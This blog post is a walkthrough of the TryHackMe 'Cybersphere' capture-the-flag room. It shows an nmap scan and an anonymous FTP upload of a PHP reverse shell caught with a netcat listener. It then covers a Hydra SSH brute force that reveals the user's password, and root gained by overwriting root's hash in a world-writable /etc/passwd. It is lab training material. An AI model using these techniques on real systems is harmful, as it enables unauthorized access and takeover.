---
layout: post
title: "TryHackMe: Cybersphere"
categories: TryHackMe
published: true
---

![banner](/assets/pictures/cybersphere/Screenshot%20(164).png)

Greetings, esteemed l33t individuals! I hope this message finds you well. Today, I had the pleasure of discovering a brand new, highly vulnerable box that has been published on TryHackMe. I am thrilled to announce that the room, named "Cybersphere", has been created by none other than the talented jackmeister. I would like to take a moment to extend my sincerest gratitude and thanks to Jack for creating this fantastic opportunity for us to hone our skills and challenge ourselves. I am sure that this room will provide us with a wealth of knowledge and a chance to expand our abilities in the world of cybersecurity. Thank you, Jack, for your hard work and dedication in creating such a valuable and educational resource for the community.

---
## Reconnaissance
Let us embark on this exciting challenge by first executing an active port scanning process utilizing the versatile and powerful tool known as nmap. This vital step will allow us to gain a comprehensive understanding of the target system's current state, including the open ports, services running, and other relevant information.

> nmap  -sC  -p-  -sV  $IP  -oN  nmap.txt  --vv

* -sC - This is the switch for scanning common vuln using common script
* -p- - This is the switch to scan all possible opened ports of 65535
* -sV - This is the switch for scanning the running services 
* -oN - This is the switch to output the result in TXT format.
* --vv - Advance verbose

```bash
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 63
| fingerprint-strings: 
|   TLSSessionReq: 
|_    220 ProFTPD Server (ProFTPD) [::ffff:10.10.209.40]
22/tcp   open  ssh?    syn-ack ttl 63
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp   open  http?   syn-ack ttl 63
443/tcp  open  https?  syn-ack ttl 63
3306/tcp open  mysql   syn-ack ttl 63 MariaDB (unauthorized)
```

Upon examination of the server, it was revealed that there were a total of three open ports, namely FTP, SSH, HTTP/HTTPS, and MYSQL services. This presents us with an opportunity to further scrutinize the system and gather valuable information that could be utilized for our purposes. To start, let us focus our attention on port 80 and enumerate all the websites present on this port. The server appears to be using a simplistic and widely used XAMPP panel, which serves as the default landing page for the system. Through this, we can gain an understanding of the setup and configurations of the server, providing us with a solid foundation for future actions.

![xampp](/assets/pictures/cybersphere/Screenshot_2023-02-12_07_28_56.png)

After thoroughly examining the website, I was unable to find anything that sparked my interest. The only exception was the phpinfo page, which provided me with essential information regarding the PHP configuration of the website. However, I was disappointed to discover that I was unable to access phpMyAdmin as it was only accessible from the local network. This meant that I could not take advantage of its powerful features, such as managing databases, creating tables, and modifying data

![dirbrute](/assets/pictures/cybersphere/Screenshot_2023-02-12_07_28_47.png)

---

## Foothold

Upon conducting a thorough examination of the nmap results, I decided to test the security measures of the FTP server by attempting to log in as an anonymous user. To my surprise, the FTP server allowed access without the requirement of a password, leaving it vulnerable to potential threats.

This realization led me to ponder the potential presence of website files stored on the FTP server. The thought of exploiting this vulnerability to gain Remote Code Execution (RCE) came to mind. The idea was to upload a reverse shell, a type of software that would allow us to remotely execute commands on the server.

Given the lack of proper security measures in place, I couldn't help but think that this could be a golden opportunity to gain RCE. The potential impact of this action would be significant and could lead to further compromise of the target system.

![ftp-login](/assets/pictures/cybersphere/Screenshot_2023-02-12_07_44_58.png)

Upload a reverse shell and setup netcat listener.

```bash
ftp> put getin.php
local: getin.php remote: getin.php
229 Entering Extended Passive Mode (|||24444|)
550 getin.php: Permission denied
ftp> cd webalizer
250 CWD command successful
ftp> put getin.php
local: getin.php remote: getin.php
229 Entering Extended Passive Mode (|||51810|)
150 Opening BINARY mode data connection for getin.php
100% |************************************************************|  2583       15.29 MiB/s    00:00 ETA
226 Transfer complete
2583 bytes sent in 00:00 (9.82 KiB/s)
ftp> bye
221 Goodbye.
```

```bash
└─$ nc -nlvp 8899
listening on [any] 8899 ...
connect to [10.8.9.53] from (UNKNOWN) [10.10.211.108] 49938
Linux cybersphere 5.15.0-60-generic #66-Ubuntu SMP Fri Jan 20 14:29:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 08:37:10 up 4 min,  0 users,  load average: 3.84, 3.64, 1.59
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
sh: 0: can't access tty; job control turned off
```

During the process of thoroughly examining a server, I stumbled upon an unusual text file that was situated in the root (/) directory. The discovery of this peculiar text file sparked my curiosity and I couldn't resist the urge to investigate further. Upon closer inspection, I realized that this text file contained vital information that could potentially prove to be valuable.

```bash
$ cat n0t34j4ck
Dear Jack ,
Remember to remove the rce after done testing , and also change your password , seriously even my grandma can guess your password in 5 seconds.
```

As per the note referenced above, it appears that the sender has expressed concern regarding the weakness of Jack's password and has used the abbreviation "LOL" to emphasize their point. Given this information, I have decided to employ the use of Hydra, a brute force tool, to attempt to gain access to Jack's SSH password. While the process is underway, I am taking a short break to enjoy a cup of coffee as I patiently wait for Hydra to provide me with a valid password. The wait may be a bit long, but the satisfaction of a successful brute force attack is worth it, and I can't help but to express my excitement with a playful "XD".

So below is the valid password for jack

```bash
[22][ssh] host: 10.10.211.108   login: jack   password: qwertyuiop
```

User flag secured!

![userflag](/assets/pictures/cybersphere/Screenshot_2023-02-12_08_45_55.png)

---

## Privilege Escalation

Upon conducting a thorough examination of the user privilege associated with the sudo group, it was determined that Jack was only authorized to execute the sudo command on the /bin/cat binary strictly for the /etc/passwd file. At initial inspection, I entertained the notion that there might be a potential for a Local Privilege Escalation (LPE) given that the kernel version (5.15.0-60-generic) was found to be vulnerable to the Dirty Pipe exploit. However, after further examination, it became apparent that this virtual machine did not have the gcc compiler installed, thus rendering it impossible to execute any exploit scripts as they would require compilation.

```bash
jack@cybersphere:~$ sudo -l
Matching Defaults entries for jack on cybersphere:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jack may run the following commands on cybersphere:
    (ALL) NOPASSWD: /bin/cat /etc/passwd
```

After spending several minutes in deep thought, I decided to run the Linpeas tool on the /tmp directory, and to my surprise, I discovered a potentially vulnerable file. Upon closer inspection, I noticed that the passwd file was writable, which is a cause for concern. This is due to the fact that its permissions were set in such a way that anyone could edit it, thus potentially leading to a serious security breach and the potential for privilege escalation. As you can see from the permissions listed below, the file was wide open, which is a clear indication of the vulnerability that it presents.

> -rwxrwxrwx 1 root root 3073 Feb 11 07:34 /etc/passwd

Thus, I generated a new hashed password using openssl and copied it into the root:x: column inside the passwd file.

```bash
jack@cybersphere:~$ openssl passwd toor $1$UuLr25tj$46BKOzZhg0rrxKxb9EI9i.
```

![passwd](/assets/pictures/cybersphere/Screenshot_2023-02-12_09_00_10.png)


Save it and switch to root using the previously created password, and we gain root!

![root](/assets/pictures/cybersphere/Screenshot_2023-02-12_09_00_27.png)

---

It is with great admiration and appreciation that I extend my heartfelt hats off to [Chilax](https://tryhackme.com/p/Chilax), who is also known by the online handle of @jackmeister, for conjuring up this magnificent challenge. I have thoroughly relished the experience of tackling your puzzle, and I eagerly anticipate the prospect of tackling another one of your captivating creations in the near future. The excitement I feel while attempting your challenges is simply indescribable, and I simply cannot wait to embark on the next one! XDXD.

